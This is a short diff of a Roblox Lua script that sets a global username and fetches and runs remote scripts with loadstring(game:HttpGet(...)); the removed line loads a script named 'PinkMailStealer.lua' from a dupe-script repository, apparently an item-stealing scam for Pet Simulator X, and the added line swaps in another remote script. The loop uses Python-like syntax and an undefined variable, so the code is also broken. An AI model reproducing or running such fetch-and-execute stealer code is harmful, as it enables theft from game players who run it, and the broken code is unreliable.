@@ -3,7 +3,7 @@ _G.Username = "plakins8"
 b = 1
 
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OliwierIsTryHard/DupeScriptPSX/main/PinkMailStealer.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/jeffreyDarmer1443123/Roblox/main/Video2.lua", true))()
 while not a == 1:
   b += 1  
 loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/jmesfo0/RobloxScripts/main/psx-jmes.lua"))()
